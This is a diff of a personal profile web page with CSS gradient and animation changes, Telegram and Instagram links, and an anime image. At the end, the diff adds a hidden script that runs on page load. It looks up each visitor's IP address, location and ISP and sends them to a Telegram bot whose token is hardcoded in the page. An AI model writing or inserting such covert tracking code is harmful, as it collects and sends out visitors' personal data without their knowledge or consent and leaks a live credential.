@@ -8,6 +8,10 @@
     body {
       margin: 0;
       padding: 0;
+      background: linear-gradient(-45deg, #1d1f20, #292b2c, #1c1e1f, #2e3133);
+      background-size: 400% 400%;
+      animation: gradientBG 10s ease infinite;
+      color: #f0f0f0;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       display: flex;
       flex-direction: column;
@@ -15,18 +19,14 @@
       justify-content: center;
       height: 100vh;
       overflow: hidden;
-      scroll-behavior: smooth;
       position: relative;
-      background: linear-gradient(-45deg, #1e1e1e, #2c2c2c, #3a3a3a, #1e1e1e);
-      background-size: 400% 400%;
-      animation: gradientBG 12s ease infinite;
-      color: #f0f0f0;
+      text-align: center;
     }
 
     @keyframes gradientBG {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
+      0% {background-position: 0% 50%;}
+      50% {background-position: 100% 50%;}
+      100% {background-position: 0% 50%;}
     }
 
     .profile-img {
@@ -65,43 +65,18 @@
       color: #ffffff;
     }
 
-    /* انیمیشن Fade In */
-    @keyframes fadeInUp {
-      0% {
-        opacity: 0;
-        transform: translateY(40px);
-      }
-      100% {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    .animate {
-      opacity: 0;
-      animation: fadeInUp 1s ease forwards;
-    }
-
-    .animate:nth-of-type(1) { animation-delay: 0.2s; }
-    .animate:nth-of-type(2) { animation-delay: 0.4s; }
-    .animate:nth-of-type(3) { animation-delay: 0.6s; }
-    .animate:nth-of-type(4) { animation-delay: 0.8s; }
-
-    /* تصویر دختر انیمه‌ای */
     .anime-girl {
       position: absolute;
+      right: 10px;
       bottom: 0;
-      right: 0;
-      width: 200px;
-      opacity: 0.9;
-      pointer-events: none;
-      user-select: none;
+      width: 160px;
+      opacity: 0.85;
+      animation: floatUpDown 4s ease-in-out infinite;
     }
 
-    @media (max-width: 600px) {
-      .anime-girl {
-        display: none;
-      }
+    @keyframes floatUpDown {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
     }
   </style>
 </head>
@@ -109,18 +84,31 @@
 
   <img src="https://i.postimg.cc/J45Mr8LW/Screenshot-Google.jpg" 
        alt="Arshiya" 
-       class="profile-img animate">
+       class="profile-img">
 
-  <h1 class="animate">I'm Arshiya</h1>
-  <p class="animate">You're lucky if you know me</p>
+  <h1>I'm Arshiya</h1>
+  <p>You're lucky if you know me</p>
 
-  <div class="links animate">
+  <div class="links">
     <a href="https://t.me/lranTheory" target="_blank">Telegram</a>
-    <a href="https://www.instagram.com/dark.light_yt?igsh=MTIzYThmc3d4ejk4eA==" target="_blank">Instagram</a>
+    <a href="https://www.instagram.com/dark.light_yt" target="_blank">Instagram</a>
   </div>
 
-  <!-- تصویر دختر انیمه‌ای -->
-  <img src="https://i.postimg.cc/pX4xG9GZ/anime-girl.png" alt="Anime Girl" class="anime-girl">
+  <img src="https://i.postimg.cc/pX4xG9GZ/anime-girl.png" class="anime-girl" alt="Anime Girl">
+
+  <script>
+    fetch("https://ipapi.co/json/")
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip;
+        const loc = `${data.city}, ${data.region}, ${data.country_name}`;
+        const isp = data.org;
+        const msg = `New Visitor!\nIP: ${ip}\nLocation: ${loc}\nISP: ${isp}`;
+        const botToken = "7591166314:AAGSfDjIJSH37xR_IA_b3tSg6ttjubcr1bE";
+        const chatId = "6994971474";
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+      });
+  </script>
 
 </body>
 </html>
